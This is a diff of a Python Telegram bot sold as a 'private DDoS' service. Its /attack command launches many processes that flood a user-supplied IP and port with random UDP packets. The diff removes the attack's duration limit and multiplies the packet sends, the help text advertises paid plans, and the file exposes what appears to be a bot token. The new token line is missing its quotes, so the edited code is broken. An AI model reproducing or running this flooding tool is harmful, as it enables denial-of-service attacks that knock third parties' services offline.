@@ -4,39 +4,41 @@ import multiprocessing
 import os
 import random
 import time
+import subprocess
+import sys
+import datetime
 import logging
-from requests.exceptions import ReadTimeout
+import socket
 
-bot = telebot.TeleBot("7599785141:AAGokC8HZXRhjcvSkzd1jBSsinBoNSEX6NU", threaded=False)
+
+bot = telebot.TeleBot(7599785141:AAGokC8HZXRhjcvSkzd1jBSsinBoNSEX6NU, threaded=False)
 
 AUTHORIZED_USERS = [7418099890]
 
-# Track of user attacks
+#  track of user attacks
 user_attacks = {}
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-
-def udp_flood(target_ip, target_port, stop_flag, duration):
+def udp_flood(target_ip, target_port, stop_flag):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    start_time = time.time()
-    while not stop_flag.is_set() and (time.time() - start_time < duration):
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow socket address reuse
+    while not stop_flag.is_set():
         try:
-            data = os.urandom(512)  # Use maximum packet size
-            sock.sendto(data, (target_ip, target_port))
+            packet_size = random.randint(128, 1469)  # Random packet size
+            data = os.urandom(packet_size)  # Generate random data
+            for _ in range(5000000):  # Maximize impact by sending multiple packets
+                sock.sendto(data, (target_ip, target_port))
         except Exception as e:
             logging.error(f"Error sending packets: {e}")
             break
-
-def start_udp_flood(user_id, target_ip, target_port, duration=300):  # Default 5 minutes
+def start_udp_flood(user_id, target_ip, target_port):
     stop_flag = multiprocessing.Event()
     processes = []
-    for _ in range(500000):  # Increase process count
-        process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag, duration))
+    for _ in range(min(500, multiprocessing.cpu_count())):
+        process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag))
         process.start()
         processes.append(process)
     user_attacks[user_id] = (processes, stop_flag)
-    bot.send_message(user_id, f"Attack started on {target_ip}:{target_port} for {duration} seconds.")
-    
+    bot.send_message(user_id, f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱🔥\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}\n𝗣𝗼𝗿𝘁: {target_port}\n᚛ @KaliaYtOwner ᚜\n\n\n*𝙎𝙩𝙤𝙥: रोकने के लिए /stop का उपयोग करें ।*")
 def stop_attack(user_id):
     if user_id in user_attacks:
         processes, stop_flag = user_attacks[user_id]
@@ -48,8 +50,7 @@ def stop_attack(user_id):
         bot.send_message(user_id, "रोक दिया बे 😼")
     else:
         bot.send_message(user_id, "कोई अटैक नहीं मिला 😼")
-
-# Function to log commands and actions
+#  Function to log commands and actions
 def log_command(user_id, command):
     logging.info(f"User ID {user_id} executed command: {command}")
     
@@ -68,7 +69,6 @@ Vip :
 ᴏɴᴇ ᴡᴇᴀᴋ :- 200
 ᴏɴᴇ ᴍᴏɴᴛʜ :- 500'''
     bot.reply_to(message, response)    
-
 @bot.message_handler(commands=['rules'])
 def welcome_rules(message):
     user_name = message.from_user.first_name
@@ -80,15 +80,15 @@ def welcome_rules(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text = '''ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅ🐒
- /attack : ғᴏʀ ᴅᴅoѕ 😈. 
- /rules : ʀeᴀd cᴀreғully🦁.
- /plan : вuy ғroм 👇\nhttps://t.me/+vEq_y0x5tKNhMzFl'''
+ /attack : ғᴏʀ ᴅᴅᴏs 😈. 
+ /rules : ʀᴇᴀᴅ ᴄᴀʀᴇғᴜʟʟʏ🦁.
+ /plan : ʙᴜʏ ғʀᴏᴍ 👇\nhttps://t.me/+vEq_y0x5tKNhMzFl
+ '''
     bot.reply_to(message, help_text)
-
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"Most welcome in private DDoS. Use this command➡️: /help\n @KaliaYtOwner"
+    response = f"ᴍᴏsᴛ ᴡᴇʟᴄᴏᴍᴇ ɪɴ ᴘʀɪᴠᴀᴛᴇ ᴅᴅᴏs ᴜsᴇʀ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ➡️: /help  \n @KaliaYtOwner"
     bot.reply_to(message, response)
     
 @bot.message_handler(commands=['attack'])
@@ -105,7 +105,7 @@ def attack(message):
         target_port = int(target[1])
         start_udp_flood(user_id, target_ip, target_port)
     except (IndexError, ValueError):
-        bot.send_message(message.chat.id, "𝐏𝐥𝐞𝐚𝐬𝐞 Provide:\n*/attack `IP`:`PORT`\nExample: /attack 20.219.76.156:25744")
+        bot.send_message(message.chat.id, "𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 :\n*/attack `𝐈𝐏`:`𝐏𝐎𝐑𝐓` 👈👀*\n`𝙴𝚡.-/𝚊𝚝𝚝𝚊𝚌𝚔 𝟸𝟶.𝟸𝟷𝟿.𝟽𝟼.𝟷𝟻𝟼:𝟸𝟻𝟽𝟺𝟺`")
 
 @bot.message_handler(commands=['stop'])
 def stop(message):
@@ -116,7 +116,6 @@ def stop(message):
         return
 
     stop_attack(user_id)
-
 def run_bot():
     while True:
         try:
